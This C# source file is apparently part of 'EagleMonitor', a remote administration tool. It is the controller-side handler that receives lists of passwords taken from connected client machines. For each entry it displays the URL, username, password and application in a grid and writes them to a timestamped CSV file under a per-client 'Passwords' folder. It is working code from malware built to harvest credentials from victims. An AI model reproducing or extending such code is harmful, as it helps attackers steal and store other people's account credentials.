using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;
using EagleMonitor.Utils;
using System;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class PasswordsPacketHandler
    {
        public PasswordsPacketHandler(PasswordsPacket passwordsPacket, ClientHandler clientHandler)
        {
            new Thread(() =>
            {
                if (passwordsPacket.passwordsList != null)
                {
                    try
                    {
                        if (clientHandler.passwordsForm.dataGridView1 != null)
                        {
                            clientHandler.passwordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.passwordsForm.dataGridView1.Rows.Clear();
                                foreach (object[] str in passwordsPacket.passwordsList)
                                {
                                    int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
                                    DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
                                    row.Cells["Column1"].Value = str[0].ToString();
                                    row.Cells["Column2"].Value = str[1].ToString();
                                    row.Cells["Column3"].Value = str[2].ToString();
                                    row.Cells["Column4"].Value = str[3].ToString();
                                }
                                Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                                clientHandler.passwordsForm.loadingCircle1.Visible = false;
                                clientHandler.passwordsForm.loadingCircle1.Active = false;
                            }));
                        }
                        else
                        { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                    }
                    catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                }
                else
                    return;
            }).Start();
        }
    }
}
